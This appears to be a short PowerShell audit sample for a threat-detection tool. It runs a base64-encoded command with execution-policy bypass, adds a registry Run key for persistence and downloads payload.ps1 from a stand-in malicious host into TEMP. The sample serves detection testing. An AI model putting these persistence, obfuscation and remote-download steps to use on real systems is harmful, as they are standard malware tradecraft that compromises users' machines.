# ThreatRecon audit sample 2 - benign PowerShell text only
$Encoded = "VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA="
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQAIAAiAEEAdQBkAGkAdABTAGEAbQBwAGwAZQAyACIAOwAgAHcAaABvAGEAbQBpACAALwBhAGwAbAA=
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "AuditSample2" -Value "powershell.exe -File C:\Users\Public\audit-sample2.ps1"
Invoke-WebRequest -Uri "http://example-malicious-test.com/payload.ps1" -OutFile "$env:TEMP\payload.ps1"
